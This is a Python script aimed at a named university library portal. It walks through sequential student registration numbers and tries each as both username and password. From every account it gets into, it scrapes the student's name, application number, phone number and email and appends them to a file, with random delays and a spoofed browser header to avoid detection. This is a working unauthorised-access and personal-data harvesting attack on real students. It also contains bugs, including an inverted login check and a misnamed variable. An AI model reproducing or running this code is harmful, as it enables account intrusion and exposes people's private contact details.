from bs4 import BeautifulSoup
import requests
import time
import random

global userid
global password
global session
global login_url, target_url
global headers, cookies

login_url = "https://webopac.vit.ac.in/index.html"
target_url = "https://webopac.vit.ac.in/cgi-bin/koha/opac-memberentry.pl"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}
cookies = {
    "CGISESSID": "e642b87d310b04833fcf40584a611410",
}

def login_page(userid, password):

    login_payload = {
        "koha_login_context": "opac",
        "userid": userid,
        "password": password,
    }

    session = requests.Session()
    login_response = session.post(login_url, headers=headers, cookies=cookies, data=login_payload)

    return session, login_response

def target_page(session, login_res):
    if checker(login_res):
        print("Login successful!")
        target_response = session.get(target_url, headers=headers)
        return target_response
    else:
        print("Login Failed. Status Code: 200")
        return 0

def checker(response):
    return ( response.text.find("incorrect") != -1 )

def finder(souptext):
    if souptext == 0:
        ret_obj = (0, 0, 0, 0, 0)
        return retobj
    else:
        try:
            soup = BeautifulSoup(souptext.text, "html.parser")

            full_name = soup.find("input", {"id": "borrower_surname"}).get("value", "").strip()
            full_name = full_name.title()

            appl_num = soup.find("input", {"id": "borrower_othernames"}).get("value", "").strip()
            phone_num = soup.find("input", {"id": "borrower_phone"}).get("value", "").strip()
            email_id = soup.find("input", {"id": "borrower_email"}).get("value", "").strip()

            ret_obj = (full_name, userid, appl_num, phone_num, email_id)
            return ret_obj
        except:
            print('error')
            ret_obj = (0, 0, 0, 0, 0)
            return ret_obj

def write(target_data, opt="o"):
    if opt == "o":
        res = "Name: {}\nRegistration Number: {}\nApplication Number: 20{}\nPhone: {}\nEmail: {}\n"
        print(res.format(target_data[0], target_data[1], target_data[2], target_data[3], target_data[4]))
    else:
        with open("output", 'a') as file:
            res = "Name: {}\nRegistration Number: {}\nApplication Number: 20{}\nPhone: {}\nEmail: {}\n"
            file.append(res.format(target_data[0], target_data[1], target_data[2], target_data[3], target_data[4]))
            print(res.format(target_data[0], target_data[1], target_data[2], target_data[3], target_data[4]))

'''
userid = input("Enter the Userid: ")
password = input("Enter the Password [press enter if same as userid]: ")
if password == "":
    userid = password
print()
'''

for i in range(80, 100):
    userid = "24BCE21{}".format(i)
    password = userid

    print(userid, password, sep="\n")

    try:
        session, login_res = login_page(userid, password)
        target_res = target_page(session, login_res)
        target_data = finder(target_res)
        write(target_data, "p")
        time.sleep(random.randint(6, 10))
    except:
        continue
